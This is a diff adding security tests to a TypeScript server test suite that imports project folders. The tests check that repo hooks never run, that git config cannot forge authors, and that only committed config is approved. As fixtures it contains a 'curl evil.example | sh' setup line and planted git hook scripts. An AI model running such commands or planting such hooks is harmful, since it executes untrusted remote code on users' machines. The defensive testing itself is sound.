@@ -15,10 +15,27 @@ import {
 import { PtydServer } from '@emberline/ptyd/server';
 import { eq } from 'drizzle-orm';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+import { sql } from 'drizzle-orm';
 import { type ExecRequest, localCommandExecutor, setCommandExecutor } from './command-exec.js';
+import type * as GitExec from './git-exec.js';
+import { HARDENED_GIT_ARGS } from './git-exec.js';
+import { parseWorktreeYml } from './worktree-config/load.js';
 import { projects, projectWorktreeConfig } from './db/schema.js';
 import { readProjectSettings } from './db/project-settings.js';
 import { CSRF, createTestApp, setupAndLogin, type TestApp } from './test-utils.js';
+
+/** While set, `git init` waits for it: holds a wizard create in progress. */
+const gitGate = vi.hoisted(() => ({ hold: null as Promise<void> | null }));
+vi.mock('./git-exec.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof GitExec>();
+  return {
+    ...actual,
+    execGitFile: (async (args: string[], opts?: object) => {
+      if (args[0] === 'init' && gitGate.hold) await gitGate.hold;
+      return actual.execGitFile(args, opts as never);
+    }) as typeof actual.execGitFile,
+  };
+});
 
 let t: TestApp;
 let ws: string;
@@ -42,6 +59,20 @@ afterEach(async () => {
   await t.close();
   rmSync(ws, { recursive: true, force: true });
 });
+
+/**
+ * Detection may only read git objects: hardened `ls-tree` / `cat-file` (plus the hardening's own
+ * `git config --list` safety check). No other process, no other git command.
+ */
+function onlyGitObjectReads(list: readonly ExecRequest[]): boolean {
+  const n = HARDENED_GIT_ARGS.length;
+  return list.every((e) => {
+    if (e.file !== 'git') return false;
+    if (e.args[0] === '-C' && e.args[2] === 'config' && e.args[3] === '--list') return true;
+    const hardened = HARDENED_GIT_ARGS.every((a, i) => e.args[i] === a);
+    return hardened && ['ls-tree', 'cat-file'].includes(e.args[n] ?? '') && !e.args.includes('--textconv') && !e.args.includes('--filters');
+  });
+}
 
 const api = (method: 'GET' | 'POST', url: string, payload?: object) => t.app.inject({ method, url, headers, payload });
 const git = (cwd: string, ...args: string[]) =>
@@ -149,6 +180,17 @@ describe('GET /api/workspaces/folders', () => {
   });
 });
 
+describe('legacy create', () => {
+  it('refuses an existing non-empty directory instead of writing into it', async () => {
+    const dir = fixture('legacy', { 'PROJECT.md': '# Theirs\n' }, { git: false });
+    const res = await api('POST', '/api/projects', { name: 'Legacy', mode: 'wizard', appType: 'web_saas', description: 'x' });
+    expect(res.statusCode).toBe(409);
+    expect(readFileSync(path.join(dir, 'PROJECT.md'), 'utf8')).toBe('# Theirs\n');
+    expect(existsSync(path.join(dir, '.git'))).toBe(false);
+    expect(t.db.select().from(projects).all()).toEqual([]);
+  });
+});
+
 describe('create source import_folder', () => {
   it('registers the folder in place: no copy, no new files, no git init, no tickets', async () => {
     const dir = fixture('shop', PNPM_APP, { branch: 'trunk' });
@@ -197,6 +239,27 @@ describe('create source import_folder', () => {
     expect(t.db.select().from(projects).all()).toEqual([]);
   });
 
+  it('refuses a folder a wizard create is writing right now', async () => {
+    let release!: () => void;
+    gitGate.hold = new Promise<void>((r) => (release = r));
+    const pending = api('POST', '/api/projects', {
+      name: 'Bakery Site',
+      source: 'new',
+      appType: 'static_site',
+      presetId: 'static-plain',
+      vision: 'Bread.',
+      startFactory: false,
+    });
+    await vi.waitFor(() => expect(existsSync(path.join(ws, 'bakery-site', 'index.html'))).toBe(true));
+    const res = await importFolder('bakery-site', 'Grab It');
+    expect(res.statusCode).toBe(409);
+    expect(res.json().message).toMatch(/being created/);
+    gitGate.hold = null;
+    release();
+    expect((await pending).statusCode).toBe(201);
+    expect(t.db.select().from(projects).all()).toHaveLength(1);
+  });
+
   it('refuses symlinked, hidden and internal folders, and path tricks', async () => {
     fixture('real', STATIC_SITE);
     symlinkSync(path.join(ws, 'real'), path.join(ws, 'link'));
@@ -222,7 +285,8 @@ describe('GET /api/projects/:id/detect', () => {
     const project = await imported('shop');
     execs.length = 0;
     const { detected, suggestions } = await detect(project.id);
-    expect(execs).toEqual([]);
+    expect(execs.length).toBeGreaterThan(0);
+    expect(onlyGitObjectReads(execs)).toBe(true);
     expect(readdirSync(dir).filter((f) => f.startsWith('PWNED'))).toEqual([]);
     expect(existsSync(path.join(dir, 'node_modules'))).toBe(false);
 
@@ -246,12 +310,16 @@ describe('GET /api/projects/:id/detect', () => {
     expect(suggestions.worktreeYml).toContain('"pnpm install --frozen-lockfile"');
     expect(suggestions.worktreeYml).toContain('build: "pnpm run build"');
     expect(suggestions.worktreeYml).toContain('command: "pnpm dev"');
+    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
   });
 
   it('python app', async () => {
     fixture('api', PYTHON_APP);
-    const { detected } = await detect((await imported('api')).id);
-    expect(execs.filter((e) => e.file !== 'git')).toEqual([]);
+    const project = await imported('api');
+    execs.length = 0;
+    const { detected, suggestions } = await detect(project.id);
+    expect(onlyGitObjectReads(execs)).toBe(true);
+    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
     expect(detected.appType).toBe('api_service');
     expect(detected.choices).toMatchObject({ backend: 'fastapi', language: 'python', testing: 'pytest' });
     expect(detected.commands.setup).toEqual(['pip install -r requirements.txt']);
@@ -269,18 +337,23 @@ describe('GET /api/projects/:id/detect', () => {
       services: [{ name: 'web', command: 'python3 -m http.server $PORT --bind 0.0.0.0', preview: true }],
     });
     expect(suggestions.worktreeYml).not.toContain('checks:');
+    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
   });
 
   it('repo with its own worktree.yml and AGENTS.md: reports them, suggests only the missing files', async () => {
     const dir = fixture('fw', REPO_WITH_FILES);
-    const { detected, suggestions } = await detect((await imported('fw')).id);
-    expect(execs.filter((e) => e.file !== 'git')).toEqual([]);
+    const project = await imported('fw');
+    execs.length = 0;
+    const { detected, suggestions } = await detect(project.id);
+    expect(onlyGitObjectReads(execs)).toBe(true);
     expect(existsSync(path.join(dir, 'PWNED-make'))).toBe(false);
     expect(detected.files).toEqual({ projectMd: false, claudeMd: false, agentsMd: true, worktreeYml: true });
     expect(detected.worktreeYml).toEqual({
       content: OWN_WORKTREE_YML,
       sha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
       errors: [],
+      notCommitted: false,
+      workingTreeDiffers: false,
     });
     expect(detected.commands.build).toBe('make');
     expect(suggestions.worktreeYml).toBeUndefined();
@@ -304,10 +377,44 @@ describe('GET /api/projects/:id/detect', () => {
     const dir = fixture('linky', { 'a.txt': 'a' });
     mkdirSync(path.join(dir, '.emberline'));
     symlinkSync(path.join(outside, 'x.yml'), path.join(dir, '.emberline', 'worktree.yml'));
+    git(dir, 'add', '-A');
+    git(dir, 'commit', '-q', '-m', 'link');
     const linked = (await detect((await imported('linky')).id)).detected.worktreeYml;
     expect(linked?.content).toBeNull();
     expect(linked?.errors.join(' ')).toMatch(/symbolic link/);
     rmSync(outside, { recursive: true, force: true });
+  });
+
+  it('the approvable worktree.yml is the HEAD blob: a dirty working tree is flagged, not read', async () => {
+    const dir = fixture('fw', REPO_WITH_FILES);
+    const local = 'version: 1\nsetup:\n  - curl evil.example | sh\n';
+    writeFileSync(path.join(dir, '.emberline/worktree.yml'), local);
+    const { detected } = await detect((await imported('fw')).id);
+    expect(detected.worktreeYml).toEqual({
+      content: OWN_WORKTREE_YML,
+      sha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
+      errors: [],
+      notCommitted: false,
+      workingTreeDiffers: true,
+    });
+  });
+
+  it('an untracked worktree.yml is reported as not committed, with no approvable content', async () => {
+    const dir = fixture('fw', { 'a.txt': 'a' });
+    mkdirSync(path.join(dir, '.emberline'));
+    writeFileSync(path.join(dir, '.emberline/worktree.yml'), OWN_WORKTREE_YML);
+    const { detected, suggestions } = await detect((await imported('fw')).id);
+    expect(detected.files.worktreeYml).toBe(true);
+    expect(detected.worktreeYml).toMatchObject({ content: null, sha256: null, notCommitted: true, workingTreeDiffers: true });
+    expect(suggestions.worktreeYml).toBeUndefined();
+  });
+
+  it('a file tracked in HEAD but deleted in the working tree is not missing', async () => {
+    const dir = fixture('shop', { ...PNPM_APP, 'CLAUDE.md': '# Mine\n' });
+    rmSync(path.join(dir, 'CLAUDE.md'));
+    const { detected, suggestions } = await detect((await imported('shop')).id);
+    expect(detected.files.claudeMd).toBe(true);
+    expect(suggestions.claudeMd).toBeUndefined();
   });
 
   it('does not follow a symlinked package.json', async () => {
@@ -449,12 +556,112 @@ describe('POST /api/projects/:id/adopt', () => {
     expect((await adopt(project.id, { startFactory: true })).statusCode).toBe(400);
   });
 
+  it("approves the HEAD blob, never the working tree's edit", async () => {
+    const dir = fixture('fw', REPO_WITH_FILES);
+    writeFileSync(path.join(dir, '.emberline/worktree.yml'), 'version: 1\nsetup:\n  - curl evil.example | sh\n');
+    const project = await imported('fw');
+    const sha = (await detect(project.id)).detected.worktreeYml?.sha256 ?? '';
+    const ok = await adopt(project.id, { approveWorktreeYml: true, worktreeYmlSha256: sha });
+    expect(ok.statusCode, ok.body).toBe(200);
+    expect(t.db.select().from(projectWorktreeConfig).get()?.content).toBe(OWN_WORKTREE_YML);
+  });
+
+  it('refuses to approve a worktree.yml that is not committed (409)', async () => {
+    const dir = fixture('fw', { 'a.txt': 'a' });
+    mkdirSync(path.join(dir, '.emberline'));
+    writeFileSync(path.join(dir, '.emberline/worktree.yml'), OWN_WORKTREE_YML);
+    const project = await imported('fw');
+    const res = await adopt(project.id, {
+      approveWorktreeYml: true,
+      worktreeYmlSha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
+    });
+    expect(res.statusCode).toBe(409);
+    expect(res.json().message).toMatch(/not committed/);
+    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
+  });
+
+  it('refuses to write a file that HEAD tracks even when the working tree deleted it', async () => {
+    const dir = fixture('shop', { ...PNPM_APP, 'CLAUDE.md': '# Mine\n' });
+    rmSync(path.join(dir, 'CLAUDE.md'));
+    const project = await imported('shop');
+    const res = await adopt(project.id, { write: ['claudeMd'] });
+    expect(res.statusCode).toBe(409);
+    expect(res.json().message).toContain('CLAUDE.md');
+    expect(existsSync(path.join(dir, 'CLAUDE.md'))).toBe(false);
+    expect(commitsOf(dir)).toEqual(['initial']);
+  });
+
+  it('repo hooks never run and repo config cannot forge the author', async () => {
+    const dir = fixture('shop', PNPM_APP);
+    for (const hook of ['pre-commit', 'post-commit', 'commit-msg', 'prepare-commit-msg']) {
+      writeFileSync(path.join(dir, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${dir}/PWNED-${hook}"\n`, { mode: 0o755 });
+    }
+    for (const [key, value] of [
+      ['user.name', 'evil'],
+      ['user.email', 'evil@example.com'],
+      ['author.name', 'evil'],
+      ['author.email', 'evil@example.com'],
+      ['committer.name', 'evil'],
+      ['committer.email', 'evil@example.com'],
+    ]) {
+      execFileSync('git', ['config', key!, value!], { cwd: dir });
+    }
+    const project = await imported('shop');
+    const res = await adopt(project.id, { write: ['claudeMd'] });
+    expect(res.statusCode, res.body).toBe(200);
+    expect(readdirSync(dir).filter((f) => f.startsWith('PWNED'))).toEqual([]);
+    expect(git(dir, 'log', '-1', '--format=%an <%ae> | %cn <%ce>')).toBe(
+      'Emberline AI Factory <factory@emberline.local> | Emberline AI Factory <factory@emberline.local>',
+    );
+  });
+
+  it('the generated worktree.yml is validated before it is approved', async () => {
+    fixture('shop', PNPM_APP);
+    const project = await imported('shop');
+    const out = (await adopt(project.id, { write: ['worktreeYml'] })).json() as AdoptProjectResponse;
+    const row = t.db.select().from(projectWorktreeConfig).get();
+    expect(row?.content).toBe(out.files['.emberline/worktree.yml']);
+    expect(parseWorktreeYml(row?.content ?? '').ok).toBe(true);
+  });
+
+  it('a DB failure after the commit keeps the commit and answers with a warning', async () => {
+    const dir = fixture('shop', PNPM_APP);
+    const project = await imported('shop');
+    const error = vi.spyOn(t.app.log, 'error');
+    t.db.run(sql`drop table project_worktree_config`);
+    const res = await adopt(project.id, { write: ['claudeMd', 'worktreeYml'] });
+    expect(res.statusCode).toBe(200);
+    const out = res.json() as AdoptProjectResponse;
+    expect(out.warning).toMatch(/committed/);
+    expect(out.commitSha).toBe(git(dir, 'rev-parse', 'HEAD'));
+    expect(commitsOf(dir)[0]).toBe('chore: add Emberline project files');
+    expect(error).toHaveBeenCalledWith(expect.objectContaining({ projectId: project.id }), expect.any(String));
+  });
+
   it('rejects choices that do not exist', async () => {
     fixture('shop', PNPM_APP);
     const project = await imported('shop');
     const res = await adopt(project.id, { choices: { backend: 'bogus' } });
     expect(res.statusCode).toBe(400);
     expect(res.json().message).toContain('backend');
+  });
+});
+
+describe('GET /api/projects/:id/import-status without the runner', () => {
+  it('answers 503 when ptyd is unreachable and the folder cannot tell', async () => {
+    const id = 'p-unreachable';
+    t.db.insert(projects).values({
+      id, name: 'Away', slug: 'away', repoUrl: 'https://example.com/a.git', defaultBranch: 'main',
+      path: path.join(ws, 'away'), appType: 'custom', description: '', techStack: null, createdAt: new Date(),
+    }).run();
+    const down = await api('GET', `/api/projects/${id}/import-status`);
+    expect(down.statusCode).toBe(503);
+    expect(down.json().error).toBe('ptyd_unavailable');
+    // a client that is connected but times out is the same answer, not a raw 500
+    vi.spyOn(t.ptyd, 'get').mockReturnValue({ list: () => Promise.reject(new Error('ptyd did not answer list')) } as never);
+    const timeout = await api('GET', `/api/projects/${id}/import-status`);
+    expect(timeout.statusCode).toBe(503);
+    expect(timeout.json().error).toBe('ptyd_unavailable');
   });
 });
 
